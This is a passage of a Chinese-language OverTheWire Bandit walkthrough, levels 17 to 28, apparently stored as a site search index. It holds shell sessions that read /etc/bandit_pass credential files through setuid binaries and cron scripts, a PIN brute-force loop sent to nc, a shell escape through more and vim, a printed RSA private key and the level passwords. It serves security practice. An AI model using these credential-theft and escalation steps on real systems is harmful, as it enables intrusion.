VQQDDAlsb2NhbGhvc3QwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDQ WpK5aICLya01rGDXaLVwQpZqWmn75BPH3O2vrqMAu14iXbKtemseBnOaB3vSfu04 QNfWLYWKrnab4hd73/TOurIHq33MnsH8Yb+lzx6VfBq/FouTviT2QBE5cVlvQV63 QPjJZ4mBomudPpDXLfbHWxsH8BYxa6lSqBjs8EqOnfEL9SRoQ+H0w66NjpOnGtLO l0oYAbmriOkmOht1tr1hoxiacNZa9WEOq01SNrIRGbhOPw07c7/rVXfz9dDBrhPQ D7FpX/UDyZvJFM3I+sTpwoUj7Ypzvhim+kVY9lGRnzuy439yGovgURCiNwlXUpDA /Kr/hRCriC3URJT4mWKdAgMBAAGjZTBjMBQGA1UdEQQNMAuCCWxvY2FsaG9zdDBL BglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0ZWQgYnkgTmNhdC4g U2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3DQEBBQUAA4IBAQBy qV/aRIcHHbKSksYqANDBrkLgfXKXKeXMZBTBq3Q4rMLF/ux7tGU+2/YPAo/6L0IZ 2/UGcW+/msmgvBE3+j5FnIB/aoqp2M8fksOiaC8OrsJ6bbShEEV+q5VITosF/Nw0 qrpoXa+7l5IF/8tuTCpi4ZQGHX+uoRgufcGkK3c8Gxsb9Xtroz8se7yLU0VKLm4d /H0Ozu4QkVTaQ+7971pXYHyip3tKuJbCeJOJledvqGvvcaIvE9S1vxEugQUq2K6u DZfCLU3TR9l29QonH13HtF5mEDNE4KaMtYxM4B4Mo3KMUHVf4hi4nKJVpjs/FSiI Vpv3P9pqfmYjEQjp7yIz -----END CERTIFICATE----- subject=CN = localhost issuer=CN = localhost --- No client certificate CA names sent Peer signing digest: SHA256 Peer signature type: RSA-PSS Server Temp Key: X25519, 253 bits --- SSL handshake has read 1339 bytes and written 373 bytes Verification error: certificate has expired --- New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384 Server public key is 2048 bit Secure Renegotiation IS NOT supported Compression: NONE Expansion: NONE No ALPN negotiated Early data was not sent Verify return code: 10 (certificate has expired) --- --- Post-Handshake New Session Ticket arrived: SSL-Session: Protocol : TLSv1.3 Cipher : TLS_AES_256_GCM_SHA384 Session-ID: 1B8DD2D7E7B861C8494FB2E901FEB50552571BFE7200C45C57EEACE66795AEEA Session-ID-ctx: Resumption PSK: 25F7290250EB5F41F5C184E597BD8493DFD4EC4E8965B10CE6A409D2909B370F30DB9A1E965F680CCD6F9C9E3BC4D0C6 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - a5 d8 4b ca c0 ad 23 28-64 e1 24 b6 18 97 bf 19 ..K...#(d.$..... 0010 - a1 6b 8c 90 89 4b 8b e8-df 1e 82 05 28 ad a8 5f .k...K......(.._ 0020 - 65 f3 03 76 14 8f d5 97-8a a5 28 ea 20 2f 06 55 e..v......(. /.U 0030 - 16 ba 4b 88 de ab 7e 00-1c 76 ba 08 b1 e7 0f a9 ..K...~..v...... 0040 - 1d 53 2a 31 16 6b 02 0d-2e dd e7 9a f4 9a e8 13 .S*1.k.......... 0050 - 13 a1 20 67 4c 24 07 53-18 c1 68 56 30 f4 92 c3 .. gL$.S..hV0... 0060 - b5 5b a6 4d 99 ff 16 fd-30 72 9b 0e f7 f2 c6 ab .[.M....0r...... 0070 - 69 c1 c0 b9 16 18 3d 5c-c4 db 4f b9 06 bf 6c 6f i.....=\\..O...lo 0080 - 51 c4 99 60 fa 03 55 af-ad 46 ed e1 53 0f 92 65 Q..`..U..F..S..e 0090 - 57 82 b9 5b ce 5b 40 37-4f d5 a8 a3 27 63 b9 2d W..[.[@7O...'c.- 00a0 - 6b e4 ea 11 f2 9f c3 f7-82 3d 16 4e 2b 40 d3 25 k........=.N+@.% 00b0 - 50 10 0f aa 74 30 49 da-c8 01 32 23 c0 b7 3c 8b P...t0I...2#..<. 00c0 - 97 8d 24 10 2d 93 73 04-33 01 d9 70 92 26 4e fc ..$.-.s.3..p.&N. Start Time: 1689568162 Timeout : 7200 (sec) Verify return code: 10 (certificate has expired) Extended master secret: no Max Early Data: 0 --- read R BLOCK --- Post-Handshake New Session Ticket arrived: SSL-Session: Protocol : TLSv1.3 Cipher : TLS_AES_256_GCM_SHA384 Session-ID: A0EF32E17C1AC0960FD46EE50181836B83644B2168CDC3087A3612EC77D9A111 Session-ID-ctx: Resumption PSK: 117786B647299C2A691BD342EDC8E39A7899490BE868D804415203AED03876A67C51CE8E55D236DAC96130391C36759A PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - a5 d8 4b ca c0 ad 23 28-64 e1 24 b6 18 97 bf 19 ..K...#(d.$..... 0010 - f3 b6 fd 9d 6e e3 35 98-ad 1d df 9e 75 38 c5 47 ....n.5.....u8.G 0020 - 15 7a c4 8f 31 3b 39 1e-ef 1c f2 56 f2 61 48 a9 .z..1;9....V.aH. 0030 - 36 ae 3d 66 e9 0d 0f ff-07 39 33 77 d7 87 8c 63 6.=f.....93w...c 0040 - fb 00 ab 1e 27 3a 91 ed-24 49 b6 e2 9d 49 a6 2b ....':..$I...I.+ 0050 - 90 ce a6 8b ea 1c bd f5-38 77 83 fc 9b 4c b4 49 ........8w...L.I 0060 - 3b d9 7c bb 52 0b 2d 38-88 a5 80 b0 8e 80 5d 66 ;.|.R.-8......]f 0070 - 1e 0b 9d 10 b2 81 11 51-0a 30 60 ec b9 2d d2 5e .......Q.0`..-.^ 0080 - 64 66 87 44 84 78 f8 e5-2b 62 cb 5f 84 aa 50 01 df.D.x..+b._..P. 0090 - 5d d6 62 fd e8 8b f8 fc-91 0c 8a f9 a7 12 6e ae ].b...........n. 00a0 - b9 40 f2 4f 90 01 0e 30-cf bf 16 3a b5 96 fc 3a .@.O...0...:...: 00b0 - 9b a5 e0 4a 54 df eb 39-68 be 05 77 6b 50 d7 a3 ...JT..9h..wkP.. 00c0 - 87 0e 7d bf 33 1a 9e 31-40 b6 3e 5e 1f a9 cf d6 ..}.3..1@.>^.... Start Time: 1689568162 Timeout : 7200 (sec) Verify return code: 10 (certificate has expired) Extended master secret: no Max Early Data: 0 --- read R BLOCK JQttfApK4SeyHwDlI9SXGR50qclOAil1 Correct! -----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama +TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT 8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM 77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3 vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY= -----END RSA PRIVATE KEY----- closed \u8fd4\u56de\u4e86\u6b63\u786e\u7684\u5bc6\u94a5\uff0c\u7136\u540e\u5199\u5165/tmp\u4e0b\u7684\u67d0\u4e2a\u6587\u4ef6\uff0c\u7136\u540e\u7ed9\u5b83\u53ea\u6709\u81ea\u5df1\u53ef\u8bfb\u53ef\u5199\u5373\u53ef # \u9996\u5148\u9700\u8981\u5728tmp\u4e0b\u65b0\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u7136\u540e\u628a\u5bc6\u94a5\u5199\u8fdb\u53bb\uff0c\u7136\u540echmod 666\u90a3\u4e2a\u6587\u4ef6 bandit16@bandit:/tmp/a$ ssh -i 1.private bandit17@localhost -p 2220 --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us on discord or IRC. Enjoy your stay! bandit17@bandit:~$","title":"level17"},{"location":"en/WarGame/bandit/#level18","text":"\u76f4\u63a5diff bandit17@bandit:~$ diff passwords.old passwords.new 42c42 < glZreTEH1V3cGKL6g4conYqZqaEj0mte --- > hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg bandit17@bandit:~$ \u7136\u540e\u767b\u5f55\uff0c\u7136\u540e\u5c31\u662f\uff1a \u250c\u2500[myc@ubuntu22]\u2500[~] \u2514\u2500\u2500\u257c[13:02:46]$ ssh bandit18@bandit.labs.overthewire.org -p 2220 _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit18@bandit.labs.overthewire.org's password: ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\ ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\ \\; : . | ' ' ' : `----' | | \\ ; ` | ' ; \\; / | ' : ; . \\ .\\ ; \\ \\ ', / | | ' \\ \\ ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to the #wargames channel on discord or IRC. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ is disabled and to /proc restricted so that users cannot snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! The /tmp directory is regularly wiped. Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few useful tools which you can find in the following locations: * gef (https://github.com/hugsy/gef) in /opt/gef/ * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/ * peda (https://github.com/longld/peda.git) in /opt/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) Both python2 and python3 are installed. --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us on discord or IRC. Enjoy your stay! Byebye ! Connection to bandit.labs.overthewire.org closed.","title":"level18"},{"location":"en/WarGame/bandit/#level19","text":"\u8fd9\u4e2a\uff0c\u544a\u8bc9\u4e86\u4f60\u6587\u4ef6\u540d\u548c\u4f4d\u7f6e\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bfb\uff0c\u800c\u4e0d\u662f\u94fe\u63a5\u4e00\u4e2abash \u56e0\u6b64\u53ef\u4ee5\u73a9\u513f\u4e00\u4e2a\u9a9a\u64cd\u4f5c \u250c\u2500[Fail][myc@ubuntu22]\u2500[~] \u2514\u2500\u2500\u257c[13:09:29]$ ssh bandit18@bandit.labs.overthewire.org -p 2220 -t cat readme _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames bandit18@bandit.labs.overthewire.org's password: awhqfNnAbc1naukrpqDYcF95h7HoMTrC Connection to bandit.labs.overthewire.org closed.","title":"level19"},{"location":"en/WarGame/bandit/#level20","text":"\u5c31\u662f\u8fd0\u884c\u8fd9\u4e2a\u5c0f\u6587\u4ef6 bandit19@bandit:~$ ./bandit20-do --help Usage: env [OPTION]... [-] [NAME=VALUE]... [COMMAND [ARG]...] Set each NAME to VALUE in the environment and run COMMAND. Mandatory arguments to long options are mandatory for short options too. -i, --ignore-environment start with an empty environment -0, --null end each output line with NUL, not newline -u, --unset=NAME remove variable from the environment -C, --chdir=DIR change working directory to DIR -S, --split-string=S process and split S into separate arguments; used to pass multiple arguments on shebang lines --block-signal[=SIG] block delivery of SIG signal(s) to COMMAND --default-signal[=SIG] reset handling of SIG signal(s) to the default --ignore-signal[=SIG] set handling of SIG signals(s) to do nothing --list-signal-handling list non default signal handling to stderr -v, --debug print verbose information for each processing step --help display this help and exit --version output version information and exit A mere - implies -i. If no COMMAND, print the resulting environment. SIG may be a signal name like 'PIPE', or a signal number like '13'. Without SIG, all known signals are included. Multiple signals can be comma-separated. GNU coreutils online help: <https://www.gnu.org/software/coreutils/> Full documentation <https://www.gnu.org/software/coreutils/env> or available locally via: info '(coreutils) env invocation' bandit19@bandit:~$ ./bandit20-do NAME=11020 cat /etc/bandit_pass/bandit20 VxCazJaVykI6W36BkBU0mJTCM8rR95XT bandit19@bandit:~$","title":"level20"},{"location":"en/WarGame/bandit/#level21","text":"\u76f4\u63a5\u770b\u56fe NvEJF7oVjkddltPSrdKEFOllh9V1IBcq","title":"level21"},{"location":"en/WarGame/bandit/#level22","text":"\u5c31\u662f\u770b\u5b88\u62a4\u8fdb\u7a0b\u5728\u8fd0\u884c\u54ea\u4e2a\u811a\u672c\uff0c\u7136\u540e\u8ddf\u7740\u53bb\u627e\u3002 bandit21@bandit:~$ man cron bandit21@bandit:~$ man crontab bandit21@bandit:~$ man 5 crontab bandit21@bandit:~$ cd /etc/cron.d/ bandit21@bandit:/etc/cron.d$ ll total 56 drwxr-xr-x 2 root root 4096 Apr 23 18:05 ./ drwxr-xr-x 108 root root 12288 Jun 10 22:51 ../ -rw-r--r-- 1 root root 62 Apr 23 18:04 cronjob_bandit15_root -rw-r--r-- 1 root root 62 Apr 23 18:04 cronjob_bandit17_root -rw-r--r-- 1 root root 120 Apr 23 18:04 cronjob_bandit22 -rw-r--r-- 1 root root 122 Apr 23 18:04 cronjob_bandit23 -rw-r--r-- 1 root root 120 Apr 23 18:04 cronjob_bandit24 -rw-r--r-- 1 root root 62 Apr 23 18:04 cronjob_bandit25_root -rw-r--r-- 1 root root 201 Jan 8 2022 e2scrub_all -rwx------ 1 root root 52 Apr 23 18:05 otw-tmp-dir* -rw-r--r-- 1 root root 102 Mar 23 2022 .placeholder -rw-r--r-- 1 root root 396 Feb 2 2021 sysstat bandit21@bandit:/etc/cron.d$ cat cronjob_bandit15_root * * * * * root /usr/bin/cronjob_bandit15_root.sh &> /dev/null bandit21@bandit:/etc/cron.d$ cat cronjob_bandit17_root * * * * * root /usr/bin/cronjob_bandit17_root.sh &> /dev/null bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22 @reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh #!/bin/bash chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff bandit21@bandit:/etc/cron.d$","title":"level22"},{"location":"en/WarGame/bandit/#level23","text":"\u548c\u4e0a\u9762\u90a3\u4e2a\u9898\u51e0\u4e4e\u4e00\u6837 bandit22@bandit:~$ cd /etc/cron.d/ bandit22@bandit:/etc/cron.d$ ll total 56 drwxr-xr-x 2 root root 4096 Apr 23 18:05 ./ drwxr-xr-x 108 root root 12288 Jun 10 22:51 ../ -rw-r--r-- 1 root root 62 Apr 23 18:04 cronjob_bandit15_root -rw-r--r-- 1 root root 62 Apr 23 18:04 cronjob_bandit17_root -rw-r--r-- 1 root root 120 Apr 23 18:04 cronjob_bandit22 -rw-r--r-- 1 root root 122 Apr 23 18:04 cronjob_bandit23 -rw-r--r-- 1 root root 120 Apr 23 18:04 cronjob_bandit24 -rw-r--r-- 1 root root 62 Apr 23 18:04 cronjob_bandit25_root -rw-r--r-- 1 root root 201 Jan 8 2022 e2scrub_all -rwx------ 1 root root 52 Apr 23 18:05 otw-tmp-dir* -rw-r--r-- 1 root root 102 Mar 23 2022 .placeholder -rw-r--r-- 1 root root 396 Feb 2 2021 sysstat bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23 @reboot bandit23 /usr/bin/cronjob_bandit23.sh &> /dev/null * * * * * bandit23 /usr/bin/cronjob_bandit23.sh &> /dev/null bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh #!/bin/bash myname=$(whoami) mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1) echo \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\" cat /etc/bandit_pass/$myname > /tmp/$mytarget bandit22@bandit:/etc/cron.d$ \u62ff\u5230\u811a\u672c\u4ee5\u540e\u76f4\u63a5\u6267\u884c\u4e00\u4e0b\uff0c\u4e0d\u8fc7\u9700\u8981\u6ce8\u610f\u7528\u6237\u662fbandit23\uff0c\u56e0\u4e3awhoami\u8f93\u51fa\u7684\u662fbandit22 bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1 8ca319486bfbbc3663ea0fbe81326349 bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349 QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G","title":"level23"},{"location":"en/WarGame/bandit/#level24","text":"\u8fd8\u662f\u90a3\u51e0\u6b65\uff0c\u7136\u540e\u770b\u5230\u4e86\u8fd9\u73a9\u610f\u513f bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh #!/bin/bash myname=$(whoami) cd /var/spool/$myname/foo || exit 1 echo \"Executing and deleting all scripts in /var/spool/$myname/foo:\" for i in * .*; do if [ \"$i\" != \".\" -a \"$i\" != \"..\" ]; then echo \"Handling $i\" owner=\"$(stat --format \"%U\" ./$i)\" if [ \"${owner}\" = \"bandit23\" ]; then timeout -s 9 60 ./$i fi rm -rf ./$i fi done bandit23@bandit:/var/spool/bandit24$ ll total 12 dr-xr-x--- 3 bandit24 bandit23 4096 Apr 23 18:04 ./ drwxr-xr-x 5 root root 4096 Apr 23 18:04 ../ drwxrwx-wx 13 root bandit24 4096 Jul 17 06:58 foo/ bandit23@bandit:/var/spool/bandit24$ # \u8fd9\u91cc\u6211\u6839\u672c\u6ca1\u6709\u5199\u7684\u6743\u9650\uff0c\u9898\u6539\u4e86\uff1f\uff1f\uff1f\uff1f\uff1f\uff1f\uff1f \u90a3\u4e5f\u7b80\u5355\uff0c\u5c31\u662f\u628a\u811a\u672c\u653e\u5728foo\u5e95\u4e0b \u811a\u672c\u5c31\u662f\u4e00\u4e2a\u8f93\u51fa\uff0c\u6c34\u7684\u4e00\u6279 #!/bin/bash cat /etc/bandit_pass/bandit24 >> /tmp/bandit23/pass \u7136\u540e\u6267\u884c\u811a\u672c\u5c31\u884c\uff0c\u6700\u540e\u5f97\u5230\u5982\u4e0b\u7ed3\u679c\uff1a VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar","title":"level24"},{"location":"en/WarGame/bandit/#level25","text":"\u8981\u5199\u7206\u7834\u811a\u672c bandit24@bandit:~$ nc localhost 30002 I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. Fail! You did not supply enough data. Try again. ^C bandit24@bandit:~$ \u811a\u672c\u5982\u4e0b\uff1a #! /bin/bash pass24=\"VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar\" for i in {0..9}{0..9}{0..9}{0..9} do echo $pass24' '$i >> mydict done echo \"done loop!\" cat ./mydict | nc localhost 30002 >> re sort re | uniq -u \u4e0a\u8fb9\u513f\u6709\u4e2a\u9898\u8c8c\u4f3c\u5e94\u8be5\u7528-u\u7684\uff0cG \u6700\u540e\u5f97\u5230\u5982\u4e0b\u7ed3\u679c\uff1a The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d","title":"level25"},{"location":"en/WarGame/bandit/#level26","text":"\u767b\u9646\u4e0a\u4ee5\u540e\u51fa\u73b0\u5982\u4e0b\u5185\u5bb9\uff1a bandit25@bandit:~$ ll total 32 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 70 root root 4096 Apr 23 18:05 ../ -rw-r----- 1 bandit25 bandit25 33 Apr 23 18:04 .bandit24.password -r-------- 1 bandit25 bandit25 1679 Apr 23 18:04 bandit26.sshkey -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r----- 1 bandit25 bandit25 4 Apr 23 18:04 .pin -rw-r--r-- 1 root root 807 Jan 6 2022 .profile bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost -p 2220 The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established. ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Could not create directory '/home/bandit25/.ssh' (Permission denied). Failed to add the host to the list of known hosts (/home/bandit25/.ssh/known_hosts). _ _ _ _ | |__ __ _ _ __ __| (_) |_ | '_ \\ / _` | '_ \\ / _` | | __| | |_) | (_| | | | | (_| | | |_ |_.__/ \\__,_|_| |_|\\__,_|_|\\__| This is an OverTheWire game server. More information on http://www.overthewire.org/wargames !!! You are trying to log into this SSH server with a password on port 2220 from localhost. !!! Connecting from localhost is blocked to conserve resources. !!! Please log out and log in again. ,----.. ,----, .---. / / \\ ,/ .`| /. ./| / . : ,` .' : .--'. ' ; . / ;. \\ ; ; / /__./ \\ : | . ; / ` ; .'___,/ ,' .--'. ' \\' . ; | ; \\ ; | | : | /___/ \\ | ' ' | : | ; | ' ; |.'; ; ; \\ \\; : . | ' ' ' : `----' | | \\ ; ` | ' ; \\; / | ' : ; . \\ .\\ ; \\ \\ ', / | | ' \\ \\ ' \\ | ; : / ' : | : ' |--\" \\ \\ .' ; |.' \\ \\ ; www. `---` ver '---' he '---\" ire.org Welcome to OverTheWire! If you find any problems, please report them to the #wargames channel on discord or IRC. --[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ is disabled and to /proc restricted so that users cannot snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! The /tmp directory is regularly wiped. Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few useful tools which you can find in the following locations: * gef (https://github.com/hugsy/gef) in /opt/gef/ * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/ * peda (https://github.com/longld/peda.git) in /opt/peda/ * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/ * pwntools (https://github.com/Gallopsled/pwntools) * radare2 (http://www.radare.org/) Both python2 and python3 are installed. --[ More information ]-- For more information regarding individual wargames, visit http://www.overthewire.org/wargames/ For support, questions or comments, contact us on discord or IRC. Enjoy your stay! _ _ _ _ ___ __ | | | (_) | |__ \\ / / | |__ __ _ _ __ __| |_| |_ ) / /_ | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\ | |_) | (_| | | | | (_| | | |_ / /| (_) | |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/ Connection to localhost closed. bandit25@bandit:~$ \u8fd9\u4e00\u6b65\u9700\u8981\u77e5\u9053etc/passwd\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u6709\u4e2a \u4e2d\u6587\u535a\u5ba2 bandit25@bandit:~$ cat /etc/passwd | grep \"bandit26\" bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext bandit25@bandit:~$ cat /usr/bin/showtext #!/bin/sh export TERM=linux exec more ~/text.txt exit 0 bandit25@bandit:~$ \u53d1\u73b0\u4f7f\u7528more\u5c55\u793a\uff0c\u8fd9\u91cc\u5c31\u53ef\u4ee5\u628a\u7a97\u53e3\u7f29\u5c0f\uff0c\u8ba9\u4ed6\u4e00\u4e0b\u5b50\u5c55\u793a\u4e0d\u5b8c\u9700\u8981\u7ffb\u9875\u5373\u53ef\uff0c\u7136\u540e\u8fdb\u5165vim\u6a21\u5f0f\u5c31\u53ef\u4ee5\u8fdb\u884c\u641c\u7d22\u554a\u3001\u7f16\u8f91\u554a\u4e4b\u7c7b\u7684\u4e8b\u4e86\uff0c\u5c31\u89e3\u51b3\u4e86\u3002 :r /etc/bandit_pass/bandit26 c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1","title":"level26"},{"location":"en/WarGame/bandit/#level27","text":"\u8fd9\u4e00\u9898\u548clevel26\u4e00\u6837\uff0c\u8fd8\u5f97\u7f29\u5c0fterminal\uff0c\u8fd9\u4e2a\u4e0d\u4f1a\uff0c\u770b\u7684\u7f51\u4e0a\u7684\u9898\u89e3\u3002 :set shell sh=/bin/sh :sh $ ll /bin/sh: 1: ll: not found $ ls -al total 44 drwxr-xr-x 3 root root 4096 Apr 23 18:04 . drwxr-xr-x 70 root root 4096 Apr 23 18:05 .. -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -rw-r--r-- 1 root root 807 Jan 6 2022 .profile drwxr-xr-x 2 root root 4096 Apr 23 18:04 .ssh -rwsr-x--- 1 bandit27 bandit26 14876 Apr 23 18:04 bandit27-do -rw-r----- 1 bandit26 bandit26 258 Apr 23 18:04 text.txt $ file bandit27-do bandit27-do: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=c148b21f7eb7e816998f07490c8007567e51953f, for GNU/Linux 3.2.0, not stripped $ ./bandit27-do Run a command as another user. Example: ./bandit27-do id $ ./bandit27-do cat /etc/bandit_pass/bandit27 YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS","title":"level27"},{"location":"en/WarGame/bandit/#level28","text":"\u4f7f\u7528git\u4ed3\u5e93 bandit27@bandit:/tmp/a$ git 